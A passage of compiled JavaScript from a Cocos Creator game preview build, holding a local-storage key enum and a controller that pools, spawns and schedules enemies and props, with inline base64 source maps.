// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.localStorageKeys = void 0;
var localStorageKeys;
(function (localStorageKeys) {
    localStorageKeys["gameBG"] = "gameBG";
})(localStorageKeys = exports.localStorageKeys || (exports.localStorageKeys = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9Mb2NhbFN0b3JhZ2VLZXlzLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOzs7QUFHbkcsSUFBWSxnQkFFWDtBQUZELFdBQVksZ0JBQWdCO0lBQ3hCLHFDQUFpQixDQUFBO0FBQ3JCLENBQUMsRUFGVyxnQkFBZ0IsR0FBaEIsd0JBQWdCLEtBQWhCLHdCQUFnQixRQUUzQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmV4cG9ydCBlbnVtIGxvY2FsU3RvcmFnZUtleXN7XHJcbiAgICBnYW1lQkcgPSBcImdhbWVCR1wiLFxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameEnemysController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6254chnxYNAb5mM5HqrGwAR', 'GameEnemysController');
// script/app/game/GameEnemysController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Enemy_1 = require("../entities/enemy/Enemy");
var SpacePartition_1 = require("../../../framework/extend/SpacePartition");
var GameProxy_1 = require("./GameProxy");
var PropBase_1 = require("../entities/prop/PropBase");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var MAX_LOGIC_COUNT = 10;
var GameEnemysController = /** @class */ (function (_super) {
    __extends(GameEnemysController, _super);
    function GameEnemysController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.propLayer = null;
        _this.enemyLayer = null;
        _this.enemyBloodLayer = null;
        _this.bgNode = null;
        _this._enemyCount = 0;
        _this.enemyLogicList = [];
        _this._enmeyMap = new Map();
        _this._enmeyBloodArray = [];
        _this._propMap = new Map();
        _this._gunsArr = [];
        _this.gameProps = [];
        _this._screenRect = cc.rect(0, 0, cc.visibleRect.width, cc.visibleRect.height);
        return _this;
    }
    Object.defineProperty(GameEnemysController.prototype, "enemyCount", {
        get: function () {
            return this._enemyCount;
        },
        set: function (value) {
            this._enemyCount = value;
        },
        enumerable: false,
        configurable: true
    });
    GameEnemysController.prototype.genEnemy = function (id) {
        var prefabPath = 'prefab/entities/enemy/enemy' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        node.active = false;
        this.enemyLayer.addChild(node);
        var enemy = node.getComponent(Enemy_1.default);
        enemy.init(id);
        var arr = this._enmeyMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._enmeyMap.set(id, arr);
        }
        arr.push(enemy);
        return enemy;
    };
    GameEnemysController.prototype.getInactiveEnemy = function (id) {
        var result = undefined;
        var arr = this._enmeyMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genEnemy(id);
        }
        return result;
    };
    GameEnemysController.prototype.genEnemyBloodNode = function () {
        var prefabPath = 'prefab/entities/blood/blood';
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        node.active = false;
        this.enemyBloodLayer.addChild(node);
        this._enmeyBloodArray.push(node);
        return node;
    };
    GameEnemysController.prototype.getInactiveEnemyBloodNode = function () {
        var result = this._enmeyBloodArray.find(function (value) { return value.active == false; });
        if (typeof result == "undefined") {
            result = this.genEnemyBloodNode();
        }
        return result;
    };
    GameEnemysController.prototype.genProp = function (id) {
        var prefabPath = 'prefab/entities/prop/prop' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        node.active = false;
        this.propLayer.addChild(node);
        var prop = node.getComponent(PropBase_1.default);
        prop.init(id);
        var arr = this._propMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._propMap.set(id, arr);
        }
        arr.push(prop);
        return prop;
    };
    GameEnemysController.prototype.getInactiveProp = function (id) {
        var result = undefined;
        var arr = this._propMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genProp(id);
        }
        return result;
    };
    GameEnemysController.prototype.getInactiveGun = function () {
        var result = this._gunsArr.find(function (value) { return value.node.active == false; });
        if (typeof result == "undefined") {
            var prefabPath = 'prefab/entities/prop/guns';
            var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
            var node = cc.instantiate(entityPrefab);
            this.propLayer.addChild(node);
            node.active = false;
            result = node.getComponent(PropBase_1.default);
            this._gunsArr.push(result);
        }
        return result;
    };
    GameEnemysController.prototype.onLoad = function () {
        this.node.on(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
        window['GameEnemysController'] = this;
    };
    GameEnemysController.prototype.onDestroy = function () {
        this.node.off(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
    };
    GameEnemysController.prototype.allAliveAndInScreenEnemy = function () {
        var list = [];
        this._screenRect.x = -this.bgNode.x - cc.visibleRect.center.x;
        this._screenRect.y = -this.bgNode.y - cc.visibleRect.center.y;
        for (var _i = 0, _a = this.enemyLayer.children; _i < _a.length; _i++) {
            var node = _a[_i];
            var enemy = node.getComponent(Enemy_1.default);
            if (!enemy.node.active || enemy.hp <= 0 || enemy.node.x + enemy.spaceCircleCollider.radius <= this._screenRect.xMin || enemy.node.x - enemy.spaceCircleCollider.radius > this._screenRect.xMax || enemy.node.y + enemy.spaceCircleCollider.radius < this._screenRect.yMin || enemy.node.y - enemy.spaceCircleCollider.radius > this._screenRect.yMax) {
                continue;
            }
            list.push(enemy);
        }
        return list;
    };
    GameEnemysController.prototype.allAliveEnemy = function () {
        return this.enemyLayer.children.filter(function (value) { return value.active && value.getComponent(Enemy_1.default).hp > 0; }).map(function (value) { return value.getComponent(Enemy_1.default); });
    };
    GameEnemysController.prototype.allActiveEnemy = function () {
        return this.enemyLayer.children.filter(function (value) { return value.active; }).map(function (value) { return value.getComponent(Enemy_1.default); });
    };
    GameEnemysController.prototype.createEnemy = function (id) {
        // console.log("createEnemy==>", id);
        this.enemyCount++;
        //绑定
        //角色900范围内随机出现
        var x1 = Math.max(-this.bgNode.x - cc.visibleRect.center.x, -this.bgNode.width / 2);
        var y1 = Math.max(-this.bgNode.y - cc.visibleRect.center.y, -this.bgNode.height / 2);
        var w1 = Math.min(cc.visibleRect.width, this.bgNode.width / 2 - x1);
        var h1 = Math.min(cc.visibleRect.height, this.bgNode.height / 2 - y1);
        var screenRect = cc.rect(x1, y1, w1, h1);
        var range = 200;
        var x2 = Math.max(x1 - range, -this.bgNode.width / 2);
        var y2 = Math.max(y1 - range, -this.bgNode.height / 2);
        var w2 = Math.min(cc.visibleRect.width + range * 2, this.bgNode.width / 2 - x2);
        var h2 = Math.min(cc.visibleRect.height + range * 2, this.bgNode.height / 2 - y2);
        var rangeRect = cc.rect(x2, y2, w2, h2);
        var partitions = [rangeRect];
        SpacePartition_1.default.partitionRect(partitions, screenRect, 30, 30);
        // let partitions = [cc.rect(-this._bgNode.width/2, -this._bgNode.height/2, this._bgNode.width, this._bgNode.height)];
        // this.allActiveEnemy().forEach(value => {
        //     SpacePartition.partitionRect(partitions, value.enemyAABB.aabb());
        // });
        //
        // SpacePartition.partitionRect(partitions, this._gameRoleController.role.roleAABB.aabb());
        var enemy = this.getInactiveEnemy(id);
        var radius = enemy.getComponent(cc.CircleCollider).radius;
        var rect = SpacePartition_1.default.randomSpace(partitions, radius * 2, radius * 2);
        if (rect) {
            enemy.node.position = rect.center;
            enemy.node.active = true;
            this.enemyLogicList.push(enemy);
            window['GameCollisionController'].looseQuadTree.insert(enemy.enemyAABB);
        }
        else {
            console.error("没有空间了...", partitions);
        }
    };
    GameEnemysController.prototype.onKillEnemy = function (enemy) {
        this.enemyLogicList.splice(this.enemyLogicList.indexOf(enemy), 1);
        window['GameCollisionController'].looseQuadTree.remove(enemy.enemyAABB);
        this.enemyCount--;
    };
    GameEnemysController.prototype.lateUpdate = function () {
        var _a;
        if (GameProxy_1.GameProxy.pauseGame) {
            return;
        }
        /** 每次处理固定数量的敌人逻辑 */
        var preNum = 0;
        for (var _i = 0, _b = this.enemyLogicList; _i < _b.length; _i++) {
            var enemy = _b[_i];
            if (enemy.logicFlag) {
                preNum++;
                enemy.logicFlag = false;
            }
            else {
                break;
            }
        }
        (_a = this.enemyLogicList).push.apply(_a, this.enemyLogicList.splice(0, preNum));
        var count = Math.min(MAX_LOGIC_COUNT, this.enemyLogicList.length);
        for (var i = 0; i < count; i++) {
            this.enemyLogicList[i].logicFlag = true;
        }
    };
    __decorate([
        property(cc.Node)
    ], GameEnemysController.prototype, "propLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameEnemysController.prototype, "enemyLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameEnemysController.prototype, "enemyBloodLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameEnemysController.prototype, "bgNode", void 0);
    GameEnemysController = __decorate([
        ccclass
    ], GameEnemysController);
    return GameEnemysController;
}(cc.Component));
exports.default = GameEnemysController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZUVuZW15c0NvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUFBLGlEQUE0QztBQUM1QywyRUFBc0U7QUFDdEUseUNBQXNDO0FBQ3RDLHNEQUFpRDtBQUUzQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQyxJQUFJLGVBQWUsR0FBRyxFQUFFLENBQUM7QUFHekI7SUFBa0Qsd0NBQVk7SUFBOUQ7UUFBQSxxRUE2TkM7UUExTkcsZUFBUyxHQUFXLElBQUksQ0FBQztRQUd6QixnQkFBVSxHQUFXLElBQUksQ0FBQztRQUcxQixxQkFBZSxHQUFXLElBQUksQ0FBQztRQUcvQixZQUFNLEdBQVcsSUFBSSxDQUFDO1FBRWQsaUJBQVcsR0FBRyxDQUFDLENBQUM7UUFFaEIsb0JBQWMsR0FBZ0IsRUFBRSxDQUFDO1FBV2pDLGVBQVMsR0FBRyxJQUFJLEdBQUcsRUFBd0IsQ0FBQztRQUM1QyxzQkFBZ0IsR0FBa0IsRUFBRSxDQUFDO1FBRXJDLGNBQVEsR0FBRyxJQUFJLEdBQUcsRUFBMkIsQ0FBQztRQUM5QyxjQUFRLEdBQW1CLEVBQUUsQ0FBQztRQUV0QyxlQUFTLEdBQW1CLEVBQUUsQ0FBQztRQXFHdkIsaUJBQVcsR0FBVyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsRUFBRSxDQUFDLEVBQUUsRUFBRSxDQUFDLFdBQVcsQ0FBQyxLQUFLLEVBQUUsRUFBRSxDQUFDLFdBQVcsQ0FBQyxNQUFNLENBQUMsQ0FBQzs7SUF1RjdGLENBQUM7SUExTUcsc0JBQUksNENBQVU7YUFBZDtZQUNJLE9BQU8sSUFBSSxDQUFDLFdBQVcsQ0FBQztRQUM1QixDQUFDO2FBRUQsVUFBZSxLQUFhO1lBQ3hCLElBQUksQ0FBQyxXQUFXLEdBQUcsS0FBSyxDQUFDO1FBQzdCLENBQUM7OztPQUpBO0lBY08sdUNBQVEsR0FBaEIsVUFBaUIsRUFBUztRQUN0QixJQUFJLFVBQVUsR0FBRyw2QkFBNkIsR0FBQyxFQUFFLENBQUM7UUFDbEQsSUFBSSxZQUFZLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsVUFBVSxFQUFFLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQztRQUMzRCxJQUFJLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLFlBQVksQ0FBQyxDQUFDO1FBQ3hDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ3BCLElBQUksQ0FBQyxVQUFVLENBQUMsUUFBUSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQy9CLElBQUksS0FBSyxHQUFVLElBQUksQ0FBQyxZQUFZLENBQUMsZUFBSyxDQUFDLENBQUM7UUFDNUMsS0FBSyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsQ0FBQztRQUNmLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxTQUFTLENBQUMsR0FBRyxDQUFDLEVBQUUsQ0FBQyxDQUFDO1FBQ2pDLElBQUksT0FBTyxHQUFHLElBQUksV0FBVyxFQUFDO1lBQzFCLEdBQUcsR0FBRyxFQUFFLENBQUM7WUFDVCxJQUFJLENBQUMsU0FBUyxDQUFDLEdBQUcsQ0FBQyxFQUFFLEVBQUUsR0FBRyxDQUFDLENBQUM7U0FDL0I7UUFDRCxHQUFHLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQ2hCLE9BQU8sS0FBSyxDQUFDO0lBQ2pCLENBQUM7SUFFTywrQ0FBZ0IsR0FBeEIsVUFBeUIsRUFBUztRQUM5QixJQUFJLE1BQU0sR0FBUyxTQUFTLENBQUM7UUFDN0IsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLFNBQVMsQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLENBQUM7UUFDakMsSUFBSSxPQUFPLEdBQUcsSUFBSSxXQUFXLEVBQUM7WUFDMUIsTUFBTSxHQUFHLEdBQUcsQ0FBQyxJQUFJLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsSUFBSSxDQUFDLE1BQU0sSUFBSSxLQUFLLEVBQTFCLENBQTBCLENBQUMsQ0FBQztTQUMxRDtRQUNELElBQUksT0FBTyxNQUFNLElBQUksV0FBVyxFQUFDO1lBQzdCLE1BQU0sR0FBRyxJQUFJLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxDQUFDO1NBQzlCO1FBQ0QsT0FBTyxNQUFNLENBQUM7SUFDbEIsQ0FBQztJQUVPLGdEQUFpQixHQUF6QjtRQUNJLElBQUksVUFBVSxHQUFHLDZCQUE2QixDQUFDO1FBQy9DLElBQUksWUFBWSxHQUFHLEVBQUUsQ0FBQyxNQUFNLENBQUMsTUFBTSxDQUFDLFVBQVUsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDM0QsSUFBSSxJQUFJLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxZQUFZLENBQUMsQ0FBQztRQUN4QyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNwQixJQUFJLENBQUMsZUFBZSxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUNwQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ2pDLE9BQU8sSUFBSSxDQUFDO0lBQ2hCLENBQUM7SUFFTyx3REFBeUIsR0FBakM7UUFDSSxJQUFJLE1BQU0sR0FBVyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLE1BQU0sSUFBSSxLQUFLLEVBQXJCLENBQXFCLENBQUMsQ0FBQztRQUNoRixJQUFJLE9BQU8sTUFBTSxJQUFJLFdBQVcsRUFBQztZQUM3QixNQUFNLEdBQUcsSUFBSSxDQUFDLGlCQUFpQixFQUFFLENBQUM7U0FDckM7UUFDRCxPQUFPLE1BQU0sQ0FBQztJQUNsQixDQUFDO0lBRU8sc0NBQU8sR0FBZixVQUFnQixFQUFTO1FBQ3JCLElBQUksVUFBVSxHQUFHLDJCQUEyQixHQUFDLEVBQUUsQ0FBQztRQUNoRCxJQUFJLFlBQVksR0FBRyxFQUFFLENBQUMsTUFBTSxDQUFDLE1BQU0sQ0FBQyxVQUFVLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQzNELElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsWUFBWSxDQUFDLENBQUM7UUFDeEMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDcEIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7UUFDOUIsSUFBSSxJQUFJLEdBQWEsSUFBSSxDQUFDLFlBQVksQ0FBQyxrQkFBUSxDQUFDLENBQUM7UUFDakQsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsQ0FBQztRQUNkLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxRQUFRLENBQUMsR0FBRyxDQUFDLEVBQUUsQ0FBQyxDQUFDO1FBQ2hDLElBQUksT0FBTyxHQUFHLElBQUksV0FBVyxFQUFDO1lBQzFCLEdBQUcsR0FBRyxFQUFFLENBQUM7WUFDVCxJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxFQUFFLEVBQUUsR0FBRyxDQUFDLENBQUM7U0FDOUI7UUFDRCxHQUFHLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ2YsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUVELDhDQUFlLEdBQWYsVUFBZ0IsRUFBUztRQUNyQixJQUFJLE1BQU0sR0FBWSxTQUFTLENBQUM7UUFDaEMsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLENBQUM7UUFDaEMsSUFBSSxPQUFPLEdBQUcsSUFBSSxXQUFXLEVBQUM7WUFDMUIsTUFBTSxHQUFHLEdBQUcsQ0FBQyxJQUFJLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsSUFBSSxDQUFDLE1BQU0sSUFBSSxLQUFLLEVBQTFCLENBQTBCLENBQUMsQ0FBQztTQUMxRDtRQUNELElBQUksT0FBTyxNQUFNLElBQUksV0FBVyxFQUFDO1lBQzdCLE1BQU0sR0FBRyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FBQyxDQUFDO1NBQzdCO1FBQ0QsT0FBTyxNQUFNLENBQUM7SUFDbEIsQ0FBQztJQUVELDZDQUFjLEdBQWQ7UUFDSSxJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMsUUFBUSxDQUFDLElBQUksQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxJQUFJLENBQUMsTUFBTSxJQUFJLEtBQUssRUFBMUIsQ0FBMEIsQ0FBQyxDQUFDO1FBQ3JFLElBQUksT0FBTyxNQUFNLElBQUksV0FBVyxFQUFDO1lBQzdCLElBQUksVUFBVSxHQUFHLDJCQUEyQixDQUFDO1lBQzdDLElBQUksWUFBWSxHQUFHLEVBQUUsQ0FBQyxNQUFNLENBQUMsTUFBTSxDQUFDLFVBQVUsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUM7WUFDM0QsSUFBSSxJQUFJLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxZQUFZLENBQUMsQ0FBQztZQUN4QyxJQUFJLENBQUMsU0FBUyxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsQ0FBQztZQUM5QixJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztZQUNwQixNQUFNLEdBQWEsSUFBSSxDQUFDLFlBQVksQ0FBQyxrQkFBUSxDQUFDLENBQUM7WUFDL0MsSUFBSSxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7U0FDOUI7UUFDRCxPQUFPLE1BQU0sQ0FBQztJQUNsQixDQUFDO0lBRUQscUNBQU0sR0FBTjtRQUNJLElBQUksQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLHFCQUFTLENBQUMsS0FBSyxDQUFDLFNBQVMsRUFBRSxJQUFJLENBQUMsV0FBVyxFQUFFLElBQUksQ0FBQyxDQUFDO1FBQ2hFLE1BQU0sQ0FBQyxzQkFBc0IsQ0FBQyxHQUFHLElBQUksQ0FBQztJQUMxQyxDQUFDO0lBRUQsd0NBQVMsR0FBVDtRQUNJLElBQUksQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLHFCQUFTLENBQUMsS0FBSyxDQUFDLFNBQVMsRUFBRSxJQUFJLENBQUMsV0FBVyxFQUFFLElBQUksQ0FBQyxDQUFDO0lBQ3JFLENBQUM7SUFHRCx1REFBd0IsR0FBeEI7UUFDSSxJQUFJLElBQUksR0FBRyxFQUFFLENBQUM7UUFDZCxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQztRQUM5RCxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQztRQUM5RCxLQUFpQixVQUF3QixFQUF4QixLQUFBLElBQUksQ0FBQyxVQUFVLENBQUMsUUFBUSxFQUF4QixjQUF3QixFQUF4QixJQUF3QixFQUFDO1lBQXJDLElBQUksSUFBSSxTQUFBO1lBQ1QsSUFBSSxLQUFLLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxlQUFLLENBQUMsQ0FBQztZQUNyQyxJQUFJLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxNQUFNLElBQUksS0FBSyxDQUFDLEVBQUUsSUFBSSxDQUFDLElBQUksS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLEdBQUcsS0FBSyxDQUFDLG1CQUFtQixDQUFDLE1BQU0sSUFBSSxJQUFJLENBQUMsV0FBVyxDQUFDLElBQUksSUFBSSxLQUFLLENBQUMsSUFBSSxDQUFDLENBQUMsR0FBRyxLQUFLLENBQUMsbUJBQW1CLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxXQUFXLENBQUMsSUFBSSxJQUFJLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQyxHQUFHLEtBQUssQ0FBQyxtQkFBbUIsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLFdBQVcsQ0FBQyxJQUFJLElBQUksS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLEdBQUcsS0FBSyxDQUFDLG1CQUFtQixDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsV0FBVyxDQUFDLElBQUksRUFBQztnQkFDalYsU0FBUzthQUNaO1lBQ0QsSUFBSSxDQUFDLElBQUksQ0FBQyxLQUFLLENBQUMsQ0FBQztTQUNwQjtRQUNELE9BQU8sSUFBSSxDQUFDO0lBQ2hCLENBQUM7SUFFRCw0Q0FBYSxHQUFiO1FBQ0ksT0FBTyxJQUFJLENBQUMsVUFBVSxDQUFDLFFBQVEsQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsTUFBTSxJQUFJLEtBQUssQ0FBQyxZQUFZLENBQUMsZUFBSyxDQUFDLENBQUMsRUFBRSxHQUFHLENBQUMsRUFBaEQsQ0FBZ0QsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxZQUFZLENBQUMsZUFBSyxDQUFDLEVBQXpCLENBQXlCLENBQUMsQ0FBQztJQUM5SSxDQUFDO0lBRUQsNkNBQWMsR0FBZDtRQUNJLE9BQU8sSUFBSSxDQUFDLFVBQVUsQ0FBQyxRQUFRLENBQUMsTUFBTSxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLE1BQU0sRUFBWixDQUFZLENBQUMsQ0FBQyxHQUFHLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsWUFBWSxDQUFDLGVBQUssQ0FBQyxFQUF6QixDQUF5QixDQUFDLENBQUM7SUFDMUcsQ0FBQztJQUVELDBDQUFXLEdBQVgsVUFBWSxFQUFTO1FBQ2pCLHFDQUFxQztRQUNyQyxJQUFJLENBQUMsVUFBVSxFQUFFLENBQUM7UUFDbEIsSUFBSTtRQUNKLGNBQWM7UUFDZCxJQUFJLEVBQUUsR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxLQUFLLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEYsSUFBSSxFQUFFLEdBQUcsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsTUFBTSxHQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ25GLElBQUksRUFBRSxHQUFHLElBQUksQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxLQUFLLEdBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxDQUFDO1FBQ2xFLElBQUksRUFBRSxHQUFHLElBQUksQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQyxNQUFNLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLEdBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxDQUFDO1FBQ3BFLElBQUksVUFBVSxHQUFHLE